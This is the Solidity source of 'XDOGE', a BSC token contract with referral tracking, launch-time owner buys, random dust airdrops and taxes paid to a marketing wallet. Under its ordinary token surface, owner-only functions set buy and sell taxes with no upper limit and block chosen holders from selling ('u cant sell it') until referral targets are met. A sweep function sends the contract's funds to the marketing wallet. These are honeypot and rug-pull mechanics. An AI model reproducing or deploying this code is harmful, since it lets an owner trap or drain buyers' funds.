// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouter {

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

interface IUniswapFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "you are not owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Token is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address payable public mkt;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _isExcludeFromFee;
    
    mapping(address => bool) public _originalShareholders;
    mapping(address => address) public _inviter;
    mapping(address => uint256) public _inviterCount;
    mapping(address => mapping(address => bool)) public _alreadyRecord;
    

    mapping(address => uint256) public _iBuyBNBAmount;

    uint256 private _totalSupply;
    IUniswapRouter public _uniswapRouter;
    mapping(address => bool) public isMarketPair;
    bool private inSwap;
    uint256 private constant MAX = ~uint256(0);
    address public _uniswapPair;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor (){

        _name = "XDOGE";
        _symbol = "XDOGE";
        _decimals = 9;
        uint256 Supply = 1000000000000000;

        _totalSupply = Supply * 10 ** _decimals;
        swapAtAmount = _totalSupply / 10000;

        address receiveAddr = 0x7F26292bdF59b543E94a5961b1b75596b935fb86;
        _balances[receiveAddr] = _totalSupply;
        emit Transfer(address(0), receiveAddr, _totalSupply);

        mkt = payable(0x20470F6D1e0fb20cCf17eC03B7714E64F87dCa26);

        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[receiveAddr] = true;
        _isExcludeFromFee[mkt] = true;

        IUniswapRouter swapRouter = IUniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _uniswapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        IUniswapFactory swapFactory = IUniswapFactory(swapRouter.factory());
        _uniswapPair = swapFactory.createPair(address(this), swapRouter.WETH());

        isMarketPair[_uniswapPair] = true;
        IERC20(_uniswapRouter.WETH()).approve(
            address(address(_uniswapRouter)),
            MAX
        );
        _isExcludeFromFee[address(swapRouter)] = true;

    }

    function setNewMktWallet(
        address payable newMKT
    ) public onlyOwner{
        mkt = newMKT;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    uint256 public _finalBuyTax=5;
    uint256 public _finalSellTax=9;

    function recuseTax(
        uint256 newBuy,
        uint256 newSell
    ) public onlyOwner {
        _finalBuyTax = newBuy;
        _finalSellTax = newSell;
    }

    bool public remainHolder = true;
    function changeRemain() public onlyOwner{
        remainHolder = !remainHolder;
    }

    uint256 swapAtAmount;
    function setSwapAtAmount(
        uint256 newValue
    ) public onlyOwner{
        swapAtAmount = newValue;
    }

    uint256 public airDropNumbs = 3;
    function setAirdropNumbs(uint256 newValue) public onlyOwner{
        airDropNumbs = newValue;
    }

    uint256 public beInvitorThreshold = 10 ** 16;
    function setBeInvitorThreshold(uint256 newValue) public onlyOwner {
        beInvitorThreshold = newValue;
    }

    mapping(address => uint256) public make_invitor_block_mapping;
    uint256 public make_invitor_pending_block = 1;

    function setmake_invitor_pending_block(uint256 newValue) public onlyOwner {
        make_invitor_pending_block = newValue;
    }

    function isValidInvitor(address account) public view returns (bool) {
        return
            block.number - make_invitor_block_mapping[account] >=
            make_invitor_pending_block;
    }

    function getBNBAmount(uint256 tokenAmount)public view returns (uint256){
        address weth = _uniswapRouter.WETH();
        if(IERC20(weth).balanceOf(_uniswapPair) > 0){
            address[] memory path = new address[](2);
            uint[] memory amount;
            path[0]=address(this);
            path[1]=address(weth);
            amount=_uniswapRouter.getAmountsOut(tokenAmount,path); 
            return amount[1];
        }else {
            return 0; 
        }
    }

   event goodbyeBot(
        address,
        address
    );
    event bindSuccess(
        address,
        address
    );
    event inviterBuy(
        address buyer,
        address inviter,
        uint256 BNBAmount,
        uint256 tokenAmount,
        uint256 inviterBuytotalBNB
    );

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (inSwap){
            _basicTransfer(from, to, amount);
            return;
        }

        bool takeFee;

        if (isMarketPair[to] && !inSwap && !_isExcludeFromFee[from] && !_isExcludeFromFee[to]) {
            uint256 _numSellToken = amount;
            if (_numSellToken > balanceOf(address(this))){
                _numSellToken = _balances[address(this)];
            }
            if (_numSellToken > swapAtAmount){
                swapTokenForETH(_numSellToken);
            }
        }

        if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap) {
            if (isMarketPair[from] || isMarketPair[to] || isContract(to)){
                require(startTradeBlock > 0);
            }
            takeFee = true;
            address INVITER = _inviter[to];

            if (isMarketPair[from] && INVITER != address(0)) {
                if (isValidInvitor(to)){
                    uint256 BNBValue = getBNBAmount(amount);
                    _iBuyBNBAmount[INVITER] += BNBValue;
                    if (
                        BNBValue >= countAddedBNBValueThreshold &&
                        _alreadyRecord[INVITER][to] == false
                    ){
                        _inviterCount[INVITER] += 1;
                        _alreadyRecord[INVITER][to] = true;
                    }
                    emit inviterBuy(
                        to,
                        INVITER,
                        BNBValue,
                        amount,
                        _iBuyBNBAmount[INVITER]
                    );
                }else{
                    emit goodbyeBot(_inviter[to],to);
                    _inviter[to] = address(0);
                    make_invitor_block_mapping[to] = 0;
                    
                }

            }

            // remainHolder
            if (
                remainHolder && 
                (
                    isMarketPair[from] || isMarketPair[from]
                )
            ) {
                address ad;
                for(uint256 i=0;i < airDropNumbs;i++){
                    ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _basicTransfer(from,ad,10**_decimals);
                }
                amount -= airDropNumbs*10**_decimals;
            }

        }

        if (
            !isMarketPair[from] &&
            !isMarketPair[to] &&
            // _originalShareholders[from] &&
            !isContract(from) &&
            !isContract(to)
        ){ // transfer
            if (
                address(0) == _inviter[to] &&
                !_isExcludeFromFee[to] &&
                _balances[to] < beInvitorThreshold
            ) {
                if (amount + _balances[to] >= beInvitorThreshold) {
                    _inviter[to] = from;
                    // _inviterCount[from] += 1;
                    make_invitor_block_mapping[to] = block.number;
                    emit bindSuccess(from, to);
                }
            }else if(!isValidInvitor(to) && make_invitor_block_mapping[to] != 0){
                // _inviterCount[_inviter[to]] -= 1;
                emit goodbyeBot(_inviter[to], to);
                _inviter[to] = address(0);
                make_invitor_block_mapping[to] = 0;
                
            }
        }

        _transferToken(from, to, amount, takeFee);
    }

    function isContract(address _addr) private view returns (bool){
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }

    uint256 public inviterCountToSellThreshold = 10;
    function setInviterCountToSellThreshold(
        uint256 newValue
    ) public onlyOwner{
        inviterCountToSellThreshold = newValue;
    }

    uint256 public inviterBuyBNBAmountToSellThreshold = 2 ether;
    function setInviterBuyBNBAmountToSellThreshold(
        uint256 newValue
    ) public onlyOwner{
        inviterBuyBNBAmountToSellThreshold = newValue;
    }

    uint256 public countAddedBNBValueThreshold = 0.23 ether;
    function setCountAddedBNBValueThreshold(
        uint256 newValue
    ) public onlyOwner{
        countAddedBNBValueThreshold = newValue;
    }
    

    function oshCanBeSell(
        address osh
    ) public view returns(bool) {
        if (_originalShareholders[osh]){
            return (
                _inviterCount[osh] >= inviterCountToSellThreshold &&
                _iBuyBNBAmount[osh] >= inviterBuyBNBAmountToSellThreshold
            );
        }else{
            return true;
        }
        
    }

    uint256 public overThresholdSellFee = 0;
    function setOverThresholdSellFee(
        uint256 newValue
    ) public onlyOwner{
        overThresholdSellFee = newValue;
    }

    uint256 public custom_inviterCountToSellThreshold = 10;
    function setCustom_inviterCountToSellThreshold(
        uint256 newValue
    ) public onlyOwner{
        custom_inviterCountToSellThreshold = newValue;
    }

    uint256 public custom_inviterBuyBNBAmountToSellThreshold = 2 ether;
    function setcustom_inviterBuyBNBAmountToSellThreshold(
        uint256 newValue
    ) public onlyOwner{
        custom_inviterBuyBNBAmountToSellThreshold = newValue;
    }

    function getSellFee(address sender) public view returns(uint256){
        if (
            _inviterCount[sender] >= custom_inviterCountToSellThreshold &&
            _iBuyBNBAmount[sender] >= custom_inviterBuyBNBAmountToSellThreshold
        ){
            return overThresholdSellFee;
        }else{
            return _finalSellTax;
        }
    }

    uint256 public inviterFee = 300;
    function setInviterFee(
        uint256 newValue
    ) public onlyOwner{
        inviterFee = newValue;
    }

    function _transferToken(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            require(oshCanBeSell(sender),"u cant sell it");

            //invitor reward
            if (isMarketPair[sender] || isMarketPair[recipient]){
                address current;
                if (isMarketPair[sender]) {
                    current = recipient;
                } else if (isMarketPair[recipient]) {
                    current = sender;
                }

                if (isMarketPair[recipient] && getSellFee(sender) == overThresholdSellFee){
                    
                }else{
                    uint256 perInviteAmount = tAmount * inviterFee / 10000;
                    if (perInviteAmount > 0){
                        address inviter = _inviter[current];

                        if (address(0) == inviter) {
                            inviter = mkt;
                        }else{
                            if(!isValidInvitor(current)){ // front run
                                _inviter[current] = address(0);
                                make_invitor_block_mapping[current] = 0;
                                inviter = mkt;
                            }
                        }
                        feeAmount += perInviteAmount;
                        _balances[inviter] = _balances[inviter] + perInviteAmount;
                        emit Transfer(sender, inviter, perInviteAmount);
                    }
                }

            }
            
            uint256 taxFee;
            if (isMarketPair[recipient]) {
                taxFee = getSellFee(sender);
            } else if (isMarketPair[sender]) {
                taxFee = _finalBuyTax;
            }
            uint256 swapAmount = tAmount * taxFee / 100;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _balances[address(this)] = _balances[address(this)] + swapAmount;
                emit Transfer(sender, address(this), swapAmount);
            }
        }

        _balances[recipient] = _balances[recipient] + (tAmount - feeAmount);
        emit Transfer(sender, recipient, tAmount - feeAmount);

    }

    uint256 public startTradeBlock;
    function startTrade(address[] calldata adrs,bool s) public onlyOwner {
        for(uint i=0;i<adrs.length;i++){
            swapToken(((random(5,adrs[i])+1)*10**16+7*10**16),adrs[i]);
        }

        if (s){
            startTradeBlock = block.number;
        }else{
            startTradeBlock = 0;
        }
        
    }

    function swapToken(uint256 tokenAmount,address to) private lockTheSwap {
        address weth = _uniswapRouter.WETH();
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(this);
        uint256 _bal = IERC20(weth).balanceOf(address(this));
        tokenAmount = tokenAmount > _bal ? _bal : tokenAmount;
        if (tokenAmount == 0) return;
        // make the swap
        _uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of CA
            path,
            address(to),
            block.timestamp
        );
    }

    function random(uint number,address _addr) private view returns(uint) {
        return uint(keccak256(abi.encodePacked(block.timestamp,block.difficulty,  _addr))) % number;
    }

    function removeERC20(address _token) external {
        if(_token != address(this) && mkt == msg.sender){
            IERC20(_token).transfer(mkt, IERC20(_token).balanceOf(address(this)));
            mkt.transfer(address(this).balance);
        }
    }

    function swapTokenForETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouter.WETH();
        _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 _bal = address(this).balance;
        if (_bal > 0.1 ether){
            mkt.transfer(_bal);
        }
    }

    function setFeeExclude(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludeFromFee[accounts[i]] = excluded;
        }
    }

    function setPrivateAddresses(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _originalShareholders[accounts[i]] = excluded;
        }
    }

    receive() external payable {}
}